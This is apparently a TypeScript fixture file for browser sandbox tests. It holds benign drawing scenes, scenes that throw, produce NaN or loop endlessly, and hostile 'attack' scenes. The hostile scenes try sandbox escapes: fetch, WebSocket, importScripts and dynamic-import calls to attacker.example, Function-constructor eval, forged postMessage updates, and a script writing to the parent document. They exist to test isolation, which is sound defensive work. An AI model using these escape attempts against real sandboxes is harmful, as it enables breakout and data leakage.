/**
 * Scene fixtures for the sandbox browser tests: broken scenes the probe must
 * reject, hostile scenes that skip the validator on purpose, to show the
 * layers beneath it hold on their own, and a scene that draws on every layer
 * of a stage. Test data only.
 */

export interface FixtureScene {
  readonly html: string;
  readonly css: string;
  readonly js: string;
}

const STAGE = "<div id='stage'></div>";

/** Validated scenes: each passes the validator but fails one probe check or throws where expected, or draws on every layer. */
export const SCENE_FIXTURES: Readonly<Record<string, FixtureScene>> = {
  /**
   * One thing on each layer of the stack (FX-1, BR-12): a band on the back
   * layer, dots on the canvas behind the drawing, a disc in the drawing over
   * the middle dot, and a dot on the canvas in front over the disc.
   */
  layers: {
    html: STAGE,
    css: '',
    js: [
      "inc.idea('Dots lie over a band, under a disc, and over it.');",
      "const stage = inc.svg('#stage', { viewBox: [0, 0, 200, 100], title: 'Layers' });",
      "stage.rect(0, 30, 200, 40, { tone: 'a', layer: 'back' });",
      "stage.dots({ tone: 'c', r: 6, layer: 'back' }).set([[40, 50], [100, 50], [160, 50]]);",
      "stage.circle(100, 50, 14, { tone: 'b' });",
      "stage.dots({ tone: 'lit', r: 3 }).set([[100, 50]]);",
      "inc.describe(() => 'Three dots over a band; a disc covers the middle one, and a small dot sits on the disc.');",
    ].join('\n'),
  },
  /** Throws on line 7, column 30 once time passes half a second. */
  'throws-later': {
    html: STAGE,
    css: '',
    js: [
      "inc.idea('A dot moves to the right.');",
      "const speed = inc.param('speed', { min: 1, max: 5, value: 2 });",
      "const stage = inc.svg('#stage', { viewBox: [0, 0, 100, 100], title: 'Dot' });",
      "const dot = stage.circle(10, 50, 4, { tone: 'lit' });",
      'const empty = [];',
      'inc.onFrame(({ time }) => {',
      '  if (time > 0.5) dot.at(empty[1].x, 0);',
      '  dot.at(speed.value * time, 0);',
      '});',
      "inc.describe(() => 'A dot.');",
      "inc.steps([{ say: 'Watch it.' }, { say: 'Faster.', set: { speed: 4 } }]);",
    ].join('\n'),
  },
  /** NaN at the top of the range: the probe must reject it. */
  'nan-at-max': {
    html: STAGE,
    css: '',
    js: [
      "inc.idea('A bar shows a number.');",
      "const h = inc.param('height', { min: 1, max: 9, step: 1, value: 4 });",
      "const stage = inc.svg('#stage', { viewBox: [0, 0, 100, 100], title: 'Bar' });",
      "const bar = stage.rect(40, 50, 20, 40, { tone: 'lit' });",
      'inc.onFrame(() => bar.set({ y: 90 - h.value * 10, height: h.value === 9 ? Math.sqrt(-1) : h.value * 10 }));',
      "inc.describe(() => 'A bar.');",
      "inc.steps([{ say: 'One.' }, { say: 'Two.' }]);",
    ].join('\n'),
  },
  /** A runaway loop that fuel stops in milliseconds. */
  runaway: {
    html: STAGE,
    css: '',
    js: [
      "inc.idea('A list that never stops growing.');",
      "const stage = inc.svg('#stage', { viewBox: [0, 0, 100, 100], title: 'List' });",
      "stage.circle(50, 50, 4, { tone: 'lit' });",
      'inc.onFrame(() => {',
      '  const xs = [1];',
      '  for (const x of xs) xs.push(x);',
      '});',
      "inc.describe(() => 'A dot.');",
      "inc.steps([{ say: 'One.' }, { say: 'Two.' }]);",
    ].join('\n'),
  },
};

const ATTACK_SCRIPT = [
  'const results = [];',
  'const attempt = (name, fn) => {',
  '  try {',
  '    const value = fn();',
  "    results.push(name + ':' + (value === undefined ? 'undefined' : typeof value));",
  '  } catch (error) {',
  "    results.push(name + ':' + error.name);",
  '  }',
  '};',
  "attempt('globalThis', () => globalThis);",
  "attempt('self', () => self);",
  "attempt('fetch', () => fetch('https://attacker.example/fetch'));",
  "attempt('websocket', () => new WebSocket('wss://attacker.example/ws'));",
  "attempt('importScripts', () => importScripts('https://attacker.example/x.js'));",
  "attempt('indexedDB', () => indexedDB.open('x'));",
  "attempt('eval', () => (() => 0).constructor('return 1')());",
  "attempt('postMessage', () => postMessage({ type: 'update', update: { commands: [], ui: { idea: 'pwned' }, needsFrame: false } }));",
  "attempt('import', () => { import('https://attacker.example/module.js').then(() => results.push('import:loaded'), () => results.push('import:blocked')); return 1; });",
  "const stage = inc.svg('#stage', { viewBox: [0, 0, 10, 10], title: 'Attack' });",
  'stage.circle(5, 5, 1);',
  "inc.describe(() => results.join(' '));",
].join('\n');

/** Hostile scenes that skip the validator. Never mounted outside these tests. */
export const ATTACK_FIXTURES: Readonly<Record<string, FixtureScene & { readonly probe?: boolean }>> = {
  /** Tries every escape from inside the Worker, and loads from the network from the frame. */
  escape: {
    html: [
      STAGE,
      "<img src='https://attacker.example/img.png' alt=''>",
      "<script>parent.document.body.dataset.pwned = 'yes';</script>",
      "<p class='bg'>styled</p>",
    ].join(''),
    css: ".bg { background-image: url('https://attacker.example/css.png'); }",
    js: ATTACK_SCRIPT,
  },
  /** A link the test clicks: the frame navigates and must be removed. */
  navigate: {
    html: `${STAGE}<a id='go' href='about:blank'>go</a>`,
    css: '',
    js: "const stage = inc.svg('#stage', { viewBox: [0, 0, 10, 10], title: 'Link' });\nstage.circle(5, 5, 1);",
  },
  /** Never returns from its first frame; without fuel only the watchdog can stop it. */
  'hang-frame': {
    html: STAGE,
    css: '',
    js: "const stage = inc.svg('#stage', { viewBox: [0, 0, 10, 10], title: 'Hang' });\nconst dot = stage.circle(5, 5, 1);\ninc.onFrame(() => { for (;;) {} });",
  },
  /** Never finishes mounting. */
  'hang-mount': {
    html: STAGE,
    css: '',
    js: 'for (;;) {}',
  },
  /** Never finishes its probe. */
  'hang-probe': {
    html: STAGE,
    css: '',
    js: "const stage = inc.svg('#stage', { viewBox: [0, 0, 10, 10], title: 'Hang' });\ninc.onFrame(() => { for (;;) {} });",
    probe: true,
  },
};
